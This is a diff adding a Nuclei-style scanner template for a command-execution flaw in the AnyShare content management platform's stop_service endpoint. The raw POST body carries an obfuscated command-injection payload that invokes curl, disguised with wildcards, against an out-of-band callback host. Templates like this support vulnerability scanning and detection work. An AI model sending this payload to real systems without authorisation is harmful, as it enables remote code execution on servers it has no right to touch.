@@ -1,0 +1,40 @@
+id: anyshare-stop_service-rce
+info:
+  name: 爱数 AnyShare智能内容管理平台 stop_service 远程命令执行
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59076/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: anyshare,rce,oob
+
+http:
+  - raw:
+      - |
+        POST /api/ServiceAgent/stop_service HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2359.58 Safari/537.36
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Length: 36
+
+        ["com;/u?r/b?n/c??l http://{{interactsh-url}}"]
+      
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
